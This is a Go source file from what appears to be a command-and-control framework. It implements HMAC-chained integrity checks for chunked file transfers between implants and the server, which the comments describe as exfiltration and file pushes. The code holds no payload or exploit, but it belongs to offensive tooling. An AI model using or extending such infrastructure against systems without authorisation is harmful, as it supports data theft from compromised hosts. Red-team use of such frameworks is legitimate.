package server

import (
	"crypto/subtle"
	"encoding/hex"
	"fmt"
	"sync"

	"github.com/forgec2/forgec2/internal/crypto"
)

// File-transfer integrity chain. Every chunked file movement (agent->server
// exfil, server->agent push) is covered by an HMAC-SHA256 chain seeded with 32
// zero bytes: mac[i] = HMAC(chainKey, mac[i-1] || chunk[i]). Any missing,
// reordered, or tampered chunk breaks the chain and is rejected before the
// chunk is committed to disk. The chain key is derived per-implant from its
// registration key (crypto.DeriveFileChainKey), so it is unique per agent and
// unguessable by a MITM that does not hold the reg key.

const (
	// MaxTransferChunkSize caps a single file-transfer chunk (upload push,
	// download pull, exfil upload result) on both sides.
	MaxTransferChunkSize = 4 << 20 // 4 MiB

	// MaxReadFileSize caps the whole-file "read" task (agents refuse larger
	// files and tell the operator to use the chunked download task instead).
	MaxReadFileSize = 64 << 20 // 64 MiB

	// MaxURLDownloadSize caps an agent-side HTTP download (download_url).
	MaxURLDownloadSize = 256 << 20 // 256 MiB
)

// fileChainState tracks the last committed MAC of the transfer chain per task
// (in-memory; a server restart mid-transfer simply breaks the chain and the
// operator re-runs the transfer).
type fileChainState struct {
	mu     sync.Mutex
	chains map[uint][]byte
}

func newFileChainState() *fileChainState {
	return &fileChainState{chains: make(map[uint][]byte)}
}

// prev returns the expected previous-MAC for the given task: the committed MAC
// of the previous chunk, or 32 zero bytes (chain seed) for the first chunk.
func (fc *fileChainState) prev(taskID uint) []byte {
	fc.mu.Lock()
	defer fc.mu.Unlock()
	if prev, ok := fc.chains[taskID]; ok {
		return prev
	}
	return make([]byte, 32)
}

// commit records the MAC of the most recently verified chunk for a task.
func (fc *fileChainState) commit(taskID uint, mac []byte) {
	fc.mu.Lock()
	defer fc.mu.Unlock()
	fc.chains[taskID] = mac
}

// reset drops chain state for a task (task errored or completed).
func (fc *fileChainState) reset(taskID uint) {
	fc.mu.Lock()
	defer fc.mu.Unlock()
	delete(fc.chains, taskID)
}

// fileChainKey returns the HMAC chain key for an implant (derived from its
// registration key). Returns nil when the reg key cannot be derived.
func (s *Server) fileChainKey(agentID string) []byte {
	return crypto.DeriveFileChainKey(s.deriveRegKey(agentID))
}

// verifyAndCommitChain checks chunkData against the expected chain link. On
// success it commits the new link and returns nil. On any failure (bad hex,
// wrong MAC) the chain is reset so the transfer cannot silently continue.
func (s *Server) verifyAndCommitChain(agentID string, taskID uint, expectedHex string, chunkData []byte) error {
	if expectedHex == "" {
		// Legacy agents or non-chunk tasks: no chain link, nothing to verify.
		return nil
	}
	want, err := hex.DecodeString(expectedHex)
	if err != nil || len(want) != 32 {
		s.fileChains.reset(taskID)
		return fmt.Errorf("malformed chain MAC")
	}
	chainKey := s.fileChainKey(agentID)
	if chainKey == nil {
		s.fileChains.reset(taskID)
		return fmt.Errorf("cannot derive file chain key")
	}
	got := crypto.FileChunkMAC(chainKey, s.fileChains.prev(taskID), chunkData)
	if subtle.ConstantTimeCompare(got, want) != 1 {
		s.fileChains.reset(taskID)
		return fmt.Errorf("chunk HMAC mismatch (tampered/reordered chunk)")
	}
	s.fileChains.commit(taskID, want)
	return nil
}

// chainForPush computes the chain link the agent must verify for a push-upload
// chunk and records the new link. Returns the prev + expected MAC hex values.
func (s *Server) chainForPush(agentID string, taskID uint, chunkData []byte) (prevHex, macHex string, err error) {
	chainKey := s.fileChainKey(agentID)
	if chainKey == nil {
		return "", "", fmt.Errorf("cannot derive file chain key")
	}
	prev := s.fileChains.prev(taskID)
	mac := crypto.FileChunkMAC(chainKey, prev, chunkData)
	s.fileChains.commit(taskID, mac)
	return hex.EncodeToString(prev), hex.EncodeToString(mac), nil
}
